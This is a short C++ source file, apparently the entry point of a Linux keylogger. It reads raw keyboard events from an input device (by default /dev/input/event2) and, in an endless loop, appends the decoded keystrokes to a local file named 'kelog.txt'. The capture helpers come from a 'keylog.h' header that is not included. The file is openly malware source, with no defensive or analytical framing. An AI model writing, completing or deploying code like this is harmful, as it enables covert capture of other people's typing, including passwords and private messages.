#include <iostream>
#ifdef __unix__
#include <termios.h>
#endif
#include "keylog.h"

using namespace std;

int main(int argc, char *argv[]) {
    string s;
    if (argc != 1) {
        s += argv[argc - 1];
    } else {
         s += "/dev/input/event2";
    }
    while (1) {
        writeToFile("kelog.txt", getAscii(getPressedKeyboardState(s)));
    }
}
